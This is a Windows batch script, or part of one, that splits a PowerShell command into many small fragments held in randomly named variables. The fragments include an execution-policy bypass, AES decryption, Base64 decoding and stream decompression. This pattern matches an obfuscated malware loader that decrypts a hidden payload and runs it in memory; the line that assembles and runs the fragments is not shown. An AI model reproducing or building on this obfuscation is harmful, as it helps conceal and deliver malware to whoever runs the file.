@echo off
set "IWNUShTQNG=ll"
set "yfwVVHFtXC=Wi"
set "HfxoCmqNHi=Sy"
set "phedXRYbBX=ll"
set "nAzMaoTiBu=32"
set "EMLZDXQRLP=0\"
set "hRlwjNodCU=\W"
set "bQwodaMfnz=py"
set "jznxWzpWmI=nd"
set "AhZCNtZBof=Po"
set "cMNYHOlCwa=em"
set "eUUIHNeGIm=rS"
set "mxviSlSNKa=xe"
set "eubLhaVWwH=y "
set "hmzctXlPsQ=rs"
set "WuAOssAEBT=we"
set "tbJNmTOOTB=he"
set "OcfKCxmOZH=po"
set "urxeHxESFY=ow"
set "mzPUqkBqPT=ws"
set "VunKaVmOwz=s\"
set "PifjigIrox=st"
set "hZnsVTNoPs=co"
set "PvFfkmnizo=he"
set "nUAYxUszHN=in"
set "aIKrgnzvRL= C"
set "JOAJICDdrE=.e"
set "HxTUmWocrc=we"
set "ptScLUKMCz=1."
set "LDlDIeerSC=:\"
set "IgCdtkyEkl= /"
set "bOqGVpItjT=do"
set "KWPVOFmqUZ=\v"
set "OevznDvgOk=cd"
set "xpiCFgXwcS= %~dp0"
set "VfSRxYpFSH=swTI"
set "gwlyyjJZIa=stem"
set "aBDrUVSGwu=C.En"
set "ZMuSPgXRZf=Nv.T"
set "xlyJjsGGId=.Cop"
set "brsvioByxV=::De"
set "iebymJLTUd=lit("
set "TwoMZnbxhx=ddin"
set "qPUeVpbWCq=em.C"
set "ewFNtIpDOU=-ep "
set "FTpfTNZmgE=Wk ="
set "PGzUShZDCt=Conv"
set "xcJnxowDZo=E.Pa"
set "FfTbkBLZWo=oin "
set "CFLfmwgOgv=$esK"
set "xyTKzbLFHF=g = "
set "HoYkiDpsSJ= = ["
set "TZQWjpJorK=[Env"
set "ulcvuiMPva= = $"
set "yhySfpFILJ=oryS"
set "USVytmuTvg=wTIK"
set "cBCzcdQQmS=ptor"
set "wObCDzgHHE=ct S"
set "cpVwXzixHa=ispo"
set "heasjpBHkx=wuG."
set "lcBRDJShix=le  "
set "NdXkncYnQk=; };"
set "WThDfTaMAt=mory"
set "RarNKfHwsb=W = "
set "NHGYoutfFs=ptog"
set "rPCAEWUben=ltlo"
set "tqATQYjYNw=Secu"
set "mQIxddyXrQ=pose"
set "bJzJmyMYMZ=)) {"
set "zkVVmZyIAY=Secu"
set "SlyIzJJNni=th('"
set "uFfcftWdxn=rans"
set "ztdJotfMKb=.Cry"
set "LYfQiTKJCC=oint"
set "lhohEQGvUL=K = "
set "RmUjXpwKTA=esaB"
set "EPUlbIyZuY=Comp"
set "BxjIEHSQZb=jIvJ"
set "xRUdsoqiii=y.Ci"
set "NnlqJmCQWZ=($fY"
set "TSChuECgFd='gni"
set "ehreYaTAas=ne);"
set "whANmRUSJX=$uTY"
set "ZJkwjjdMnK=.Con"
set "XCgUnwjPoI=ionM"
set "pKdXYHisKG=form"
set "XcXRcEVcez=tem."
set "uTnzPoxelw=Obje"
set "ewHoakhnEK=y]::"
set "fsSITmqvLk=).Sp"
set "RxVSvJbGfi=null"
set "tpiXlTAQgh=V = "
set "udtgayFwQi=tem."
set "QCazQtmXcs=Bmor"
set "wrkTViUlqf=ck($"
set "ieJbpGgehb=rity"
set "obbJLJaZUd=m(, "
set "egVhlTfPhj=stem"
set "ActFoStWCw=raph"
set "fvuWlqqaTW=TllA"
set "bRXCIyMvrx=;$xb"
set "SLeoKLwnoA=.Mem"
set "CEJzyqAtoO=hy.A"
set "gvLjBySJKJ=-joi"
set "EtnsQOxRXo=ose("
set "shgKkrbDId=ion."
set "pLwHhkcoSE=)($Z"
set "KuZyZGJlLj=swTI"
set "XPuvmgxtQh=);$u"
set "blhlXwfVbT=Disp"
set "BsZEvwOblF=;$pg"
set "JfvRwYfJZz=ay()"
set "MnAqzYRmeS=K = "
set "zOhFghQjTG=eam("
set "DceaVoeanX=ewLi"
set "WqajUbqvtq=xbHb"
set "nBIewywZYb=6] -"
set "INaTPRtjLo=m.IO"
set "AuqBpxuYLC=.Sec"
set "NwwtUzYzaw=oW.D"
set "wVryBdTrWQ=gjYA"
set "SEZkXCRkit=IK ="
set "IOTzoCGIIF=ing("
set "ZXjOjSbYel==');"
set "DHasCbBJYV=[Sys"
set "nySakyYiTa=]::("
set "whcrIppzro=$bYB"
set "fcXyKaoofl=AXW."
set "IYSpjSQjFh=, $s"
set "dlXwjRHsvN=BC;$"
set "vfoEOgQtOM=yste"
set "gEnSsTpqnD=-nop"
set "UhbFrwnKfR=bypa"
set "ThQxVpcRHr= [Sy"
set "AOWiuwOIyV=ring"
set "SJuzesSfTF=Disp"
set "pGqpaabLlm=106u"
set "ibIZPKtARt=tem."
set "zIKMMfbGTg=ress"
set "aouVqNndfo= if "
set "FpaRsZLUEw=[Sys"
set "PQvCthQKLb=;$VE"
set "BIoMpFTxUP=TYoE"
set "kkXaOwUCAO=($fY"
set "ZNVTjSCJXR=('da"
set "mayOAeRoyU=Mode"
set "urFGHiQZpx=Wdi."
set "VhVzaSfyjL=.Mod"
set "eTfpWRnzoN=ment"
set "YJTlrqkOHZ=TYoE"
set "XIMTEuDozl=  $Z"
set "fOQVnorFws=File"
set "LuTannHeNl=dj0C"
set "mMpEFOwUOX='')("
set "gkZAwEVWKa=tion"
set "pwBywssOBl=rtS4"
set "CQWuKfVLkP=rity"
set "KPfgrXyQLK=F'[-"
set "AlPRsotHkg=esMa"
set "nXRQwARbEn===')"
set "pTaakpFDCP=iron"
set "bhhPzNDfUI=comm"
set "nuBNOYohal=New-"
set "TXjoMHCdzw=uG.T"
set "ZYyumgOIcj=AP, "
set "AvMPtLGejW= New"
set "DqAzZnpKct=Comp"
